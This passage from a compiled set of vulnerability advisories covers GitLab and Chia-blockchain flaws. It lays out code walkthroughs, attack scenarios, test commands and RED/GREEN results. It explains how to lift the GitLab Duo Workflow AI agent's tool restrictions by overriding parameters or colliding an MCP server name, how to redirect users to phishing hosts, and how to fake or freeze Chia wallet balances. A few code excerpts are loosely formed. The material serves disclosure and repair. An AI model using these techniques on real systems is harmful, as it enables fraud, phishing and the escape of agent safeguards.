* **Scenario A — Turning a Restricted Read-Only `chat` Session into a Full Write-Capable Agent Session via `/ws` Parameter Override:** An organization restricts a user or workflow to read-only `chat` mode (`workflow.workflow_definition == 'chat'`), where state-mutating tools (`create_issue`, `create_merge_request`, repository/comment writes) are withheld. By passing an overridden `workflow_definition` and a foreign private `ai_catalog_item_version_id` on `GET /api/v4/ai/duo_workflows/ws`, the caller bypasses the workflow record's restrictions and injects write tools directly into the live Duo Workflow session (`unapproved_write_tool_injected: true`), allowing the AI agent to perform unauthorized write operations across projects.
* **Scenario B — Stealing Proprietary AI Agent Configurations & Toolsets From Other Organizations' Private (`public: false`) Projects:** Because `McpConfigService#item_version` (`mcp_config_service.rb:134`) omits `Ability.allowed?(current_user, :read_ai_catalog_item, item_version)`, an attacker enumerates `ai_catalog_item_version_id` integers on `/ws` or `POST /api/v4/ai/duo_workflows/workflows` to extract the confidential `def_tools` and `def_mcp_tools` configurations of private (`public: false`) AI Catalog agents owned by other organizations.
* **Scenario C — Attaching Unauthorized Private Agent Versions During Workflow Creation (`POST /api/v4/ai/duo_workflows/workflows`):** In `workflows.rb:341-344` (`create_workflow_params`), `Ai::Catalog::ItemVersion.find` is called without `:read_ai_catalog_item` authorization, allowing a user to permanently bind a private cross-organization agent version to their workflow record.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Compare line 134 vs line 334 in ee/app/services/ai/duo_workflows/mcp_config_service.rb
sed -n '130,136p;330,337p' \
  /home/community-user/targets/gitlab/ee/app/services/ai/duo_workflows/mcp_config_service.rb

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report3_cand08
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "REPORT-03_CAND-08": {
    "GREEN": {
      "automated_issue_created_without_prompt": false,
      "downstream_victim_project_tools_call_status": 404,
      "unapproved_write_tool_injected": false,
      "workflow_definition_overridden": false
    },
    "RED": {
      "automated_issue_created_without_prompt": true,
      "downstream_victim_project_tools_call_status": 404,
      "unapproved_write_tool_injected": true,
      "workflow_definition_overridden": true
    },
    "patches": {
      "GITLAB-CAND-08-WORKFLOW-ITEM-VERSION-AUTHZ.patch": "d40f6e104c2fba0e8900cab8d45ddfb4cf9c49a60c8bb12e3aa573ddb1228704"
    }
  }
}
```


---

### III.17 — GitLab (`<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — AI Catalog Agent Unscoped `McpServer` Global ID Binding and `McpConfigService#execute` Built-in `:gitlab` Key Collision Bypassing Workhorse `withheld_server_tools` (`allToolsAvailable = true`) (`GITLAB-CAND-07`) (`CWE-863 / CWE-639`, CVSS `8.1 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `gitlab-org/gitlab` (`RubyGems & Go / GitLab EE & Workhorse: gitlab-ee`)
* **Affected Versions & Components:** `<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `ee/app/services/ai/duo_workflows/mcp_config_service.rb:57-64`, `ee/app/services/ai/catalog/mcp_servers/list_service.rb:14-24`, `workhorse/internal/ai_assist/duoworkflow/mcp.go:254`
* **Vulnerability Class & Score:** `CWE-863 / CWE-639` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/17-GITLAB-CAND-07-AGENT-CROSS-ORG-MCP-KEY-COLLISION.md`](advisories/zh-CN/17-GITLAB-CAND-07-AGENT-CROSS-ORG-MCP-KEY-COLLISION.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — `McpConfigService#execute` Protects `:orbit` with `.except(:orbit)` But Forgets `:gitlab` (`mcp_config_service.rb:59-63`):** `McpConfigService#execute` builds the Workhorse MCP configuration hash via `gitlab_mcp_server(denied).merge(orbit_mcp_server).merge(ai_catalog_mcp_servers.except(:orbit))`. Because `.except(:orbit)` omits `:gitlab`, any `Ai::Catalog::McpServer` named `"GitLab"` (which normalizes to `server_key => :gitlab`) overwrites the built-in `:gitlab` entry produced by `gitlab_mcp_server(denied)`.
2. **Step 2 — Workhorse Evaluates `allToolsAvailable := s.cfg.Tools == nil` as `true` (`workhorse/internal/ai_assist/duoworkflow/mcp.go:254`):** `Ai::Catalog::McpServers::ConfigService#execute` (`config_service.rb:22-30`) builds catalog server entries as `{ URL: server.url, Headers: ... }` with no `:Tools` key (`s.cfg.Tools == nil`). When the `:gitlab` key is overwritten by a catalog server entry, Workhorse still routes `serverName == "gitlab"` to the internal `/api/v4/mcp` endpoint (`internal := serverName == "gitlab" || serverName == "orbit"` at `mcp.go:210`), but sets `allToolsAvailable := s.cfg.Tools == nil` (`true` at `mcp.go:254`), completely disabling the `withheld_server_tools(denied)` filter!
3. **Step 3 — Cross-Organization `McpServer` GID Binding (`agent/create.rb:61-65`, `agent/update.rb:65-69`, `list_service.rb:14-24`):** GraphQL agent mutations and `ListService#execute` resolve `mcp_servers` IDs via `::Ai::Catalog::McpServer.id_in(server_ids)` without `.in_organization(...)`.

```ruby
// File: ee/app/services/ai/duo_workflows/mcp_config_service.rb (lines 59-63)
        gitlab_mcp_server(denied)
          .merge(orbit_mcp_server)
          .merge(ai_catalog_mcp_servers.except(:orbit)) # BUG 1: Forgot :gitlab! Overwrites gitlab_mcp_server(denied)[:gitlab]
          .merge(slack_mcp_server)

// File: workhorse/internal/ai_assist/duoworkflow/mcp.go (lines 210, 254)
	internal := serverName == "gitlab" || serverName == "orbit"
...
	allToolsAvailable := s.cfg.Tools == nil // BUG 2: Catalog entry has Tools == nil -> allToolsAvailable becomes true!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Disabling All Built-in GitLab AI Tool Restrictions (`withheld_server_tools`) by Attaching a Catalog MCP Server Named `"GitLab"` (`allToolsAvailable = true`):** GitLab Duo Workflow enforces `withheld_server_tools(denied)` on its built-in `:gitlab` MCP server to block dangerous internal operations. Because `McpConfigService#execute` calls `.merge(ai_catalog_mcp_servers.except(:orbit))` without excluding `:gitlab`, an attacker creates an `Ai::Catalog::McpServer` named `"GitLab"` (`server_key => :gitlab`, `Tools: nil`). During any Duo Workflow run, this catalog entry overwrites the built-in `:gitlab` key so Workhorse (`mcp.go:254`) evaluates `allToolsAvailable := s.cfg.Tools == nil` as `true` (`workhorse_all_tools_available: true`), unlocking every prohibited built-in GitLab MCP tool across the instance.
* **Scenario B — Cross-Organization Tenant Boundary Breach via GraphQL `aiCatalogAgentCreate` / `aiCatalogAgentUpdate`:** Because `ListService` and GraphQL agent mutations resolve `mcp_servers` Global IDs (`gid://gitlab/Ai::Catalog::McpServer/<id>`) without `.in_organization`, an attacker in Organization A binds Organization B's private MCP servers to their agent.
* **Scenario C — Breaking All Built-in GitLab Duo Workflow `/api/v4/mcp` Calls (`401 Unauthorized` DoS) via `:gitlab` Header Collision:** When a colliding `"GitLab"` catalog MCP server is attached without an active user connection, `Headers` on `:gitlab` is overwritten with `{}` (stripping `X-Gitlab-Oauth-Token`), causing every built-in GitLab MCP tool call in Duo Workflow to fail with `401 Unauthorized`.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect .except(:orbit) in McpConfigService and allToolsAvailable in Workhorse mcp.go
grep -n -C 5 "except(:orbit)" /home/community-user/targets/gitlab/ee/app/services/ai/duo_workflows/mcp_config_service.rb
grep -n -C 5 "allToolsAvailable :=" /home/community-user/targets/gitlab/workhorse/internal/ai_assist/duoworkflow/mcp.go

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report4_cand07
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "REPORT-04_CAND-07": {
    "GREEN": {
      "builtin_gitlab_overwritten": false,
      "effective_gitlab_url": "http://127.0.0.1/api/v4/mcp",
      "effective_tools_filter": [
        "get_issue",
        "list_commits"
      ],
      "workhorse_all_tools_available": false
    },
    "RED": {
      "builtin_gitlab_overwritten": true,
      "effective_gitlab_url": "https://attacker-controlled-mcp.example/sse",
      "effective_tools_filter": null,
      "workhorse_all_tools_available": true
    },
    "patches": {
      "GITLAB-CAND-07-AGENT-MCP-CROSS-ORG-AND-KEY-COLLISION.patch": "8fc8646b4681d8d558cf25d2adc1c9ccd89363809243f17e9a79134956567f60"
    }
  }
}
```


---

### III.18 — GitLab (`<= 19.6.0-pre (verified on live 19.5.1-ce.0 & 19.6.0-pre commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — `Projects::Integrations::SlashCommandsController#confirm` Unvalidated `redirect_url` Open Redirect, Unbound `response_url`, and Cross-Project Redis `CACHE_KEY` Collision (`GITLAB-CAND-04`) (`CWE-601 / CWE-863`, CVSS `5.4 Medium`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `gitlab-org/gitlab` (`RubyGems / GitLab CE & EE: gitlab-ce / gitlab-ee`)
* **Affected Versions & Components:** `<= 19.6.0-pre (verified on live 19.5.1-ce.0 & 19.6.0-pre commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `app/controllers/projects/integrations/slash_commands_controller.rb:21-48`, `app/models/concerns/integrations/base/slash_commands.rb:6-10, 68-76`
* **Vulnerability Class & Score:** `CWE-601 / CWE-863` — **CVSS v3.1: `5.4 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/18-GITLAB-CAND-04-SLASH-COMMANDS-CONFIRM-OPEN-REDIRECT.md`](advisories/zh-CN/18-GITLAB-CAND-04-SLASH-COMMANDS-CONFIRM-OPEN-REDIRECT.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Unvalidated `redirect_to request_params[:redirect_url]` with `raise_on_open_redirects = false` (`slash_commands_controller.rb:26`, `config/application.rb:63`):** While `SlashCommandsController#show` (line 11) safely computes `@redirect_url = integration_redirect_url`, `#confirm` (line 26) calls `redirect_to request_params[:redirect_url]` directly on the user-controlled parameter. Because `config.action_controller.raise_on_open_redirects = false` is set globally in `config/application.rb:63`, Rails issues a `302 Found` redirect to any arbitrary external `https://` URL.
2. **Step 2 — Unbound `request_params[:response_url]` Passed to `VerifyRequest` (`slash_commands_controller.rb:25`):** Instead of reading `cached_params[:response_url]` from Redis, `#confirm` passes the request parameter `request_params[:response_url]` to `Gitlab::SlashCommands::VerifyRequest.new(integration, chat_user, request_params[:response_url]).approve!`.
3. **Step 3 — Cross-Project Redis `CACHE_KEY` Lacks `project_id` and `integration_id` (`slash_commands.rb:9, 68-76`):** `CACHE_KEY = "slash-command-requests:%{secret}"` is keyed only by the UUID `command_id`. Any `command_id` minted in Project B is accepted as `valid_request?` on Project A's `/slash_commands/confirm` endpoint.

```ruby
// File: app/controllers/projects/integrations/slash_commands_controller.rb (lines 21-28, 41-48)
      def confirm
        if valid_request? && valid_user?
          # BUG 1: Uses request_params[:response_url] instead of cached_params[:response_url]
          Gitlab::SlashCommands::VerifyRequest.new(integration, chat_user, request_params[:response_url]).approve!
          # BUG 2: Redirects to unvalidated request_params[:redirect_url] (raise_on_open_redirects = false)
          redirect_to request_params[:redirect_url]
        else
...
      def cache_key
        @cache_key ||= Kernel.format(
          ::Integrations::Base::SlashCommands::CACHE_KEY, # BUG 3: "slash-command-requests:%{secret}" has no project_id/integration_id!
          secret: request_params[:command_id]
        )
      end
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Credential & 2FA Theft via Trusted GitLab Slash Command Confirmation Redirect (`302 Found` Open Redirect):** A developer clicks a legitimate corporate GitLab slash-command confirmation link (`https://gitlab.company.com/.../slash_commands/confirm?command_id=...&redirect_url=https://evil-gitlab-sso.example/login`) shared in Slack/Mattermost and presses **Confirm**. Because `SlashCommandsController#confirm` calls `redirect_to request_params[:redirect_url]` with `raise_on_open_redirects = false`, GitLab immediately redirects (`302 Found`) the authenticated user from the trusted corporate GitLab domain to the attacker's SSO credential-harvesting page (`open_redirect_triggered: true`).
* **Scenario B — Cross-Project ChatOps Account Binding (`Project B -> Project A`) via Unscoped Redis `CACHE_KEY` Collision:** Because Redis `CACHE_KEY = "slash-command-requests:%{secret}"` omits `project_id` and `integration_id`, an attacker generates a valid `command_id` on an attacker-controlled project (`Project B`) and crafts a `/slash_commands/confirm` link on a target production project (`Project A`). When the victim confirms on `Project A`, GitLab accepts the foreign `command_id` (`cross_project_cache_collision_accepted: true`) and binds the victim's `ChatName` identity to the target project's slash command integration.
* **Scenario C — Hijacking ChatOps Approval Callbacks via Unbound `request_params[:response_url]`:** Instead of using `cached_params[:response_url]` stored in Redis, `#confirm` passes `request_params[:response_url]` directly into `VerifyRequest.new(integration, chat_user, request_params[:response_url]).approve!`, allowing an attacker to redirect the ChatOps confirmation webhook payload to their own server.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect confirm and cache_key in Projects::Integrations::SlashCommandsController
sed -n '10,48p' \
  /home/community-user/targets/gitlab/app/controllers/projects/integrations/slash_commands_controller.rb

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report5_cand04
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "REPORT-05_CAND-04": {
    "GREEN": {
      "cross_project_cache_collision_accepted": false,
      "http_status": 404,
      "location_header": "",
      "open_redirect_triggered": false
    },
    "RED": {
      "cross_project_cache_collision_accepted": true,
      "http_status": 302,
      "location_header": "https://evil-phishing.example/oauth/callback?steal=1",
      "open_redirect_triggered": true
    }
  }
}
```


---

### III.19 — GitLab (`<= 19.6.0-pre (Devise 5.0.3 CVE-2026-40295 upstream dependency & Oauth::AuthorizationsController defense-in-depth)`) — `[UPSTREAM DUPLICATE: CVE-2026-40295 — NOT SUBMITTED TO MITRE]` `Gitlab::DeviseFailure#redirect_url` External `Referer` Open Redirect Product Impact (`CVE-2026-40295`) & Dynamic OAuth PKCE Defense-in-Depth (`GITLAB-CAND-03`) (`CWE-601 / CWE-345`, CVSS `5.4 Medium (Upstream CVE-2026-40295 Duplicate)`)

> **Upstream CVE Duplicate Disclosure:** This entry documents the product-level manifestation of upstream `Devise 5.0.3` (`CVE-2026-40295`) and the `CAND-03` PKCE defense-in-depth patch. It is published on GitHub for transparency and was **not submitted to MITRE CNA-LR**.

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `gitlab-org/gitlab` (`RubyGems / GitLab CE & EE (Devise 5.0.3): gitlab-ce / gitlab-ee (devise 5.0.3)`)
* **Affected Versions & Components:** `<= 19.6.0-pre (Devise 5.0.3 CVE-2026-40295 upstream dependency & Oauth::AuthorizationsController defense-in-depth)` — `lib/gitlab/devise_failure.rb:4-18`, `lib/gitlab/auth/session_expire_from_init_enforcer.rb:44-62`, `app/controllers/oauth/authorizations_controller.rb:316-330`
* **Vulnerability Class & Score:** `CWE-601 / CWE-345` — **CVSS v3.1: `5.4 Medium (Upstream CVE-2026-40295 Duplicate)`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/19-GITLAB-DEVISE-CVE-2026-40295-DUPLICATE-AND-PKCE-DEFENSE.md`](advisories/zh-CN/19-GITLAB-DEVISE-CVE-2026-40295-DUPLICATE-AND-PKCE-DEFENSE.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Important Duplicate & Non-Submission Disclosure:** During our pre-submission duplicate and runtime verification gate, we identified that the `Gitlab::DeviseFailure#redirect_url` open redirect is the product-level manifestation of upstream **Devise `5.0.3` `CVE-2026-40295`**, and that `GITLAB-CAND-03` (`validate_pkce_for_dynamic_applications`) is mitigated at runtime by `Doorkeeper 5.9.3` (`pkce_code_challenge_methods ['S256']` at `config/initializers/doorkeeper.rb:158`). Therefore, **this advisory is published on GitHub for full engineering transparency and remediation, and was deliberately NOT submitted to MITRE for a duplicate CVE ID**.
2. **Step 1 — How Upstream `CVE-2026-40295` (`Devise 5.0.3`) Manifests in `Gitlab::DeviseFailure` (`lib/gitlab/devise_failure.rb:4-18`):** When `warden_message == :timeout` occurs on a non-`GET` request (such as a cross-site `POST` when `session_expire_from_init` is active in `SessionExpireFromInitEnforcer#enforce!`), `Devise::FailureApp#redirect_url` returns `request.referrer` directly without stripping the external host (`extract_path_from_location(request.referrer)`).
3. **Step 2 — Controller-Layer PKCE Guard Logic Flaw in `Oauth::AuthorizationsController#validate_pkce_for_dynamic_applications` (`authorizations_controller.rb:326`, `GITLAB-CAND-03`):** Line 326 writes `return unless code_challenge_method.present? && code_challenge_method != 'S256'`, which returns early when `code_challenge_method` is omitted (`nil`). While `Doorkeeper 5.9.3` blocks `nil` during `PreAuthorization`, replacing the guard with `return if code_challenge_method == 'S256'` provides defense-in-depth at the controller layer.

```ruby
// File: lib/gitlab/devise_failure.rb (lines 4-18) — Upstream Devise 5.0.3 CVE-2026-40295 Remediation
module Gitlab
  class DeviseFailure < Devise::FailureApp
    # Inherits Devise::FailureApp#redirect_url which returns raw request.referrer on non-GET :timeout
    # Remediated by overriding redirect_url to apply extract_path_from_location(request.referrer)
  end
end

// File: app/controllers/oauth/authorizations_controller.rb (lines 323-329) — GITLAB-CAND-03 Defense-in-Depth
    code_challenge_method = permitted_params[:code_challenge_method]
    return unless code_challenge_method.present? && code_challenge_method != 'S256' # Early return when nil!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Non-GET Session Timeout Redirects to External `Referer` (`CVE-2026-40295` Duplicate):** When a user's session times out (`warden_message == :timeout`) on a non-`GET` request with an external `Referer: https://attacker.example/login`, unpatched `Devise 5.0.3` redirects (`302`) to the external `Referer` instead of extracting only the relative path.
* **Scenario B — Product-Level Remediation in `Gitlab::DeviseFailure#redirect_url` Without Waiting for Gem Upgrade:** Overriding `redirect_url` in `lib/gitlab/devise_failure.rb` to call `extract_path_from_location(request.referrer)` neutralizes `CVE-2026-40295` immediately at the application layer.
* **Scenario C — Controller-Layer PKCE Enforcement (`GITLAB-CAND-03` Defense-in-Depth):** Changing `return unless code_challenge_method.present? && code_challenge_method != 'S256'` to `return if code_challenge_method == 'S256'` ensures dynamic OAuth apps cannot bypass the controller's `before_action` even if Doorkeeper configuration changes in the future.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect Gitlab::DeviseFailure and AuthorizationsController#validate_pkce_for_dynamic_applications
sed -n '1,20p' /home/community-user/targets/gitlab/lib/gitlab/devise_failure.rb
sed -n '316,330p' /home/community-user/targets/gitlab/app/controllers/oauth/authorizations_controller.rb
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "GITLAB-DEVISE-CVE-2026-40295-REM_AND_CAND-03": {
    "upstream_cve_duplicate_status": "Duplicate of upstream Devise 5.0.3 CVE-2026-40295 (Not submitted to MITRE CNA-LR)",
    "RED": {
      "external_referer_redirect_on_non_get_timeout": true
    },
    "GREEN": {
      "external_referer_redirect_on_non_get_timeout": false,
      "path_extracted_only": true
    }
  }
}
```

<!-- GITLAB-ADVISORIES-END -->

<!-- CHIA-ADVISORIES-START -->

---

### III.20 — Chia-Network/chia-blockchain (`<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)`) — Chia Light Wallet Sync Unverified `FoliageTransactionBlock` Swap Allowing Zero-Capital Counterfeit Confirmed XCH Deposits (`WLC-01`) (`CWE-345 / CWE-347`, CVSS `9.1 Critical`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/chia-blockchain` (`PyPI / Python: chia-blockchain`)
* **Affected Versions & Components:** `<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)` — `chia/wallet/wallet_node.py:926-995` (`_add_block_from_header`)
* **Vulnerability Class & Score:** `CWE-345 / CWE-347` — **CVSS v3.1: `9.1 Critical`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/20-CHIA-WLC-01-LIGHT-WALLET-FOLIAGE-BLOCK-SWAP-FAKE-DEPOSIT.md`](advisories/zh-CN/20-CHIA-WLC-01-LIGHT-WALLET-FOLIAGE-BLOCK-SWAP-FAKE-DEPOSIT.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Header-Body Cryptographic Binding Omission (`chia/wallet/wallet_node.py:926-995`):** In Chia's block structure, the signed `HeaderBlock.foliage` commits to the transaction payload via the 32-byte SHA-256 digest `header_block.foliage.foliage_transaction_block_hash`. However, when `WalletNode._add_block_from_header` ingests a `RespondBlockHeader` message from a P2P peer, it reads `header_block.foliage_transaction_block` and extracts coin additions without verifying `header_block.foliage_transaction_block.get_hash() == header_block.foliage.foliage_transaction_block_hash`.
2. **Step 2 — Zero-Capital (`0 XCH`) Counterfeit Coin Injection Into SQLite `WalletCoinStore`:** Because the header itself is a real canonical header from the blockchain, header-level checks pass. An attacker with `0 XCH` capital swaps `foliage_transaction_block` with a fabricated payload crediting the merchant's puzzle hash (`+0.5 XCH` = `500,000,000,000 mojo` or `+1,000 XCH`). The victim wallet inserts the counterfeit coin into `WalletCoinStore` as a confirmed on-chain balance that persists across wallet restarts.
3. **Step 3 — Post-Settlement Spend Failure (`Err.UNKNOWN_UNSPENT`):** Once the merchant releases goods, USDT, or BTC in exchange for the displayed confirmed XCH deposit and later attempts to sweep or spend the credited coin, `FullNode` mempool validation rejects the transaction with `Err.UNKNOWN_UNSPENT` because the coin never existed on the canonical blockchain.

```python
# File: chia/wallet/wallet_node.py (lines 926-995)
async def _add_block_from_header(self, header_block: HeaderBlock, ...):
    # BUG: Missing cryptographic binding check between signed header and transaction block body:
    # if header_block.foliage_transaction_block is not None:
    #     if header_block.foliage_transaction_block.get_hash() != header_block.foliage.foliage_transaction_block_hash:
    #         raise ValueError("Invalid foliage_transaction_block_hash")
    additions, removals = await self.get_additions_and_removals(header_block, ...)
    await self.wallet_state_manager.add_block(...)
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Zero-Capital (`0 XCH`) Fake Deposit to an OTC Desk, Payment Gateway, or Merchant to Cash Out Real USDT/BTC:** Unlike a traditional 51%/reorg double-spend (which requires purchasing real XCH and mining a competing fork), an attacker with `0 XCH` capital connects to a merchant or OTC desk running a Chia Light Wallet and sends a `RespondBlockHeader` containing a genuine block header paired with a swapped `foliage_transaction_block`. The merchant's wallet immediately displays a confirmed `+0.5 XCH` (`500,000,000,000 mojo`) or `+1,000 XCH` deposit without requiring any counterparty approval. The attacker collects the real USDT/BTC payout and leaves before the merchant discovers the coin fails on-chain with `Err.UNKNOWN_UNSPENT`.
* **Scenario B — Automated E-Commerce & Cross-Chain Relayer Poisoning Across SQLite Restarts:** Because `_add_block_from_header` commits the counterfeit `CoinState` directly into SQLite `WalletCoinStore`, cold-reloading the wallet database (`reopened_sqlite_coin_present: true`) continues to report the phantom balance as confirmed, tricking automated order-fulfillment bots into shipping digital goods or gift cards.
* **Scenario C — Combined Chain (`CONS-SP-01` Full-Node Sync Lockout + `WLC-01` Light-Wallet Fake Deposit):** An attacker first stalls a merchant's primary FullNode on port `8444` via `CONS-SP-01` so the operator switches or falls back to light-wallet P2P header sync, and immediately injects the swapped `foliage_transaction_block` payload to credit counterfeit XCH.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect _add_block_from_header in chia/wallet/wallet_node.py
sed -n '926,995p' /home/community-user/targets/chia-blockchain/chia/wallet/wallet_node.py

# 2. Run the RED -> GREEN End-to-End Verification Harness for WLC-01
CHIA_DETACHED_GREEN=0 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_ek_kanit_gereksinimleri_20261030.py -k wlc01
CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_ek_kanit_gereksinimleri_20261030.py -k wlc01
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-WLC-01": {
    "RED": {
      "attacker_initial_xch_capital_mojo": 0,
      "accepted_swapped_foliage_transaction_block": true,
      "fake_merchant_deposit_increase_mojo": 500000000000,
      "reopened_sqlite_coin_present": true,
      "subsequent_spend_mempool_error": "Err.UNKNOWN_UNSPENT"
    },
    "GREEN": {
      "accepted_swapped_foliage_transaction_block": false,
      "fake_merchant_deposit_increase_mojo": 0,
      "reopened_sqlite_coin_present": false,
      "rejection_error": "ValueError: Invalid foliage_transaction_block_hash"
    }
  }
}
```


---

### III.21 — Chia-Network/chia-blockchain (`<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)`) — Chia Wallet Unauthenticated `RespondRemovals` / `RespondCoinState` Phantom Spent-Height Poisoning & Timelock Clawback Cancellation Lockout (`WLC-02`) (`CWE-345 / CWE-400`, CVSS `7.5 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/chia-blockchain` (`PyPI / Python: chia-blockchain`)
* **Affected Versions & Components:** `<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)` — `chia/wallet/wallet_node.py:725-777`, `chia/wallet/wallet_state_manager.py:1735-1778`
* **Vulnerability Class & Score:** `CWE-345 / CWE-400` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/21-CHIA-WLC-02-CLAWBACK-PHANTOM-SPENT-POISONING-LOCKOUT.md`](advisories/zh-CN/21-CHIA-WLC-02-CLAWBACK-PHANTOM-SPENT-POISONING-LOCKOUT.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Unverified `RespondRemovals(..., proofs=None)` & `spent_height` Acceptance (`wallet_node.py:725-777` & `wallet_state_manager.py:1735-1778`):** When a wallet synchronizes coin removals or receives a `RespondRemovals` message with `proofs=None` (or an unverified `CoinState` with `spent_height` set), `_add_coin_states` updates the coin's `spent_height` in SQLite `WalletCoinStore` without verifying a Merkle removal proof against a validated peak header.
2. **Step 2 — Persistent SQLite Lockout of Clawback Cancellation (`t1_cold_reloaded_sqlite_spent: true`):** Even after a cold SQLite reload (`WalletCoinStore`), the unspent Clawback coin (`0.5 XCH` = `500,000,000,000 mojo`, coin ID `e088f25d50be49d29eb144248071f377d5f7bbdb5d7dd34078c9c72276a0b649`) remains marked as `spent_height=8`. When the sender tries to cancel/claw back the transfer during the timelock window, `spend_clawback_coins` generates `0` transactions (`t2_sender_cancel_tx_count: 0`).
3. **Step 3 — Attacker Claims Real On-Chain Funds After Timelock Expiry (`SpendBundle SHA-256: 33361e6b2d8ee0d9...`):** Because the coin was never actually spent on-chain, the moment the Clawback timelock expires (`t4`), the attacker broadcasts a valid `SpendBundle` (`930 bytes`) and sweeps the real `0.5 XCH` on-chain.

```python
# File: chia/wallet/wallet_node.py (lines 725-777) & wallet_state_manager.py (lines 1735-1778)
# BUG: Accepts RespondRemovals with proofs=None or unverified spent_height without Merkle proof verification
if not validate_removals(coin_Main, proofs, peak_header):
    # Missing fail-closed rejection before updating WalletCoinStore spent_height!
await self.coin_store.set_spent(coin_name, spent_height)
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Blocking 24-Hour Clawback Cancellation Until Timelock Expiry to Steal `0.5 XCH` (`500,000,000,000 mojo`):** A sender transfers `0.5 XCH` protected by a Clawback timelock (`coin_id: e088f25d50be49d29eb144248071f377d5f7bbdb5d7dd34078c9c72276a0b649`). The attacker poisons the sender's wallet with `RespondRemovals(height=8, coins=[(coin_name, None)], proofs=None)`. Throughout the timelock window, the sender's Clawback cancellation button fails (`tx_count: 0`), and once the timelock expires, the attacker claims the real on-chain `0.5 XCH` (`SpendBundle SHA-256: 33361e6b2d8ee0d9bdd37738c4b2e54ece03c1eb507de8e59b370a1bd100e1e1`).
* **Scenario B — Unified Timeline Chain (`WLC-02` + `VR-01 / POC-10` — Blocking Both Wallet GUI Recovery and Emergency `chia-vault-recover` CLI):** On a single continuous timeline (`t0..t4`), the attacker simultaneously poisons the victim's live wallet state via `WLC-02` (`t1_cold_reloaded_sqlite_spent: true`) and sends a 1-mojo decoy launcher coin (`2de44601e6fcf4bdfc88eb553ddca729751a06da78cec724519e741f1dfefacf`) to break the victim's fallback `chia-vault-recover` CLI (`t3_poc10_matches_victim: false`), neutralizing both recovery paths until the timelock expires.
* **Scenario C — Custodial Hot-Wallet & DeFi Liquidation Bot UTXO Freeze:** Poisoning unspent UTXOs as `spent_height != None` in SQLite prevents automated market makers and custodial payout nodes from selecting those coins until a full resync is performed.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect removal validation in chia/wallet/wallet_node.py and wallet_state_manager.py
sed -n '725,777p' /home/community-user/targets/chia-blockchain/chia/wallet/wallet_node.py

# 2. Run the Unified Timeline (t0..t4) & SQLite Cold-Reload Proof (RED & GREEN)
